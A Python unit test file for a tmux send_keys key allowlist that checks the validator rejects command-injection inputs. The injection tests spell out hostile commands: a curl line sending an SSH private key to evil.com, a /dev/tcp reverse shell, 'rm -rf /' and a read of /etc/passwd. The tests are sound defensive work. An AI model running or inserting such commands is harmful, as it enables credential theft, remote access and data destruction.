"""Unit tests for tmux send_keys allowlist.

These tests verify the key validation logic that prevents command injection
via the send_keys API. Without this allowlist, an attacker could send
arbitrary text (shell commands) to running tmux sessions.
"""


# ── Replicated send_keys validation logic ────────────────────────────────────

_ALLOWED_TMUX_KEYS = frozenset({
    "Enter", "Escape", "Tab", "BTab", "Space", "BSpace",
    "Up", "Down", "Left", "Right", "Home", "End",
    "PageUp", "PageDown", "IC", "DC",  # Insert, Delete
    "C-c", "C-d", "C-z", "C-l", "C-a", "C-e", "C-k", "C-u",
    "C-r", "C-p", "C-n", "C-b", "C-f", "C-w",
    "M-b", "M-f", "M-d",  # Alt/Meta combos
    "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12",
    "y", "n", "q",  # common single-char confirmations
})


def _validate_key(keys: str) -> tuple[bool, str]:
    """Standalone replica of the key validation in send_keys."""
    if keys not in _ALLOWED_TMUX_KEYS:
        return False, f"key '{keys}' not in allowed set"
    return True, "ok"


# ── Tests: allowed keys ──────────────────────────────────────────────────────

def test_enter_allowed():
    assert _validate_key("Enter") == (True, "ok")


def test_control_sequences_allowed():
    for key in ["C-c", "C-d", "C-z", "C-l", "C-a", "C-e", "C-k", "C-u",
                "C-r", "C-p", "C-n", "C-b", "C-f", "C-w"]:
        assert _validate_key(key) == (True, "ok"), f"{key} should be allowed"


def test_navigation_keys_allowed():
    for key in ["Up", "Down", "Left", "Right", "Home", "End", "PageUp", "PageDown"]:
        assert _validate_key(key) == (True, "ok"), f"{key} should be allowed"


def test_function_keys_allowed():
    for i in range(1, 13):
        key = f"F{i}"
        assert _validate_key(key) == (True, "ok"), f"{key} should be allowed"


def test_special_keys_allowed():
    for key in ["Escape", "Tab", "BTab", "Space", "BSpace", "IC", "DC"]:
        assert _validate_key(key) == (True, "ok"), f"{key} should be allowed"


def test_meta_keys_allowed():
    for key in ["M-b", "M-f", "M-d"]:
        assert _validate_key(key) == (True, "ok"), f"{key} should be allowed"


def test_confirmation_chars_allowed():
    for key in ["y", "n", "q"]:
        assert _validate_key(key) == (True, "ok"), f"{key} should be allowed"


# ── Tests: command injection blocked ─────────────────────────────────────────

def test_shell_command_blocked():
    """The most dangerous attack: sending a full shell command."""
    ok, msg = _validate_key("rm -rf /")
    assert ok is False
    assert "not in allowed set" in msg


def test_curl_exfiltration_blocked():
    ok, _ = _validate_key("curl https://evil.com/steal?data=$(cat ~/.ssh/id_rsa)")
    assert ok is False


def test_reverse_shell_blocked():
    ok, _ = _validate_key("bash -i >& /dev/tcp/evil.com/4444 0>&1")
    assert ok is False


def test_arbitrary_text_blocked():
    """Even benign-looking text shouldn't be sendable — use send_text for that."""
    ok, _ = _validate_key("hello world")
    assert ok is False


def test_single_arbitrary_char_blocked():
    """Only y, n, q are allowed as single chars."""
    ok, _ = _validate_key("a")
    assert ok is False
    ok, _ = _validate_key("x")
    assert ok is False


def test_empty_string_blocked():
    ok, _ = _validate_key("")
    assert ok is False


def test_newline_injection_blocked():
    ok, _ = _validate_key("Enter\nrm -rf /")
    assert ok is False


def test_semicolon_injection_blocked():
    ok, _ = _validate_key("q; rm -rf /")
    assert ok is False


def test_pipe_injection_blocked():
    ok, _ = _validate_key("q | cat /etc/passwd")
    assert ok is False


def test_case_sensitivity():
    """Key names are case-sensitive — 'enter' is not 'Enter'."""
    ok, _ = _validate_key("enter")
    assert ok is False
    ok, _ = _validate_key("ENTER")
    assert ok is False
    ok, _ = _validate_key("c-c")
    assert ok is False


# ── Tests: completeness ──────────────────────────────────────────────────────

def test_allowlist_size():
    """Verify the allowlist has the expected number of entries."""
    assert len(_ALLOWED_TMUX_KEYS) == 48


if __name__ == "__main__":
    tests = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    for t in tests:
        t()
        print(f"  PASS: {t.__name__}")
    print(f"\nAll {len(tests)} send_keys tests passed!")
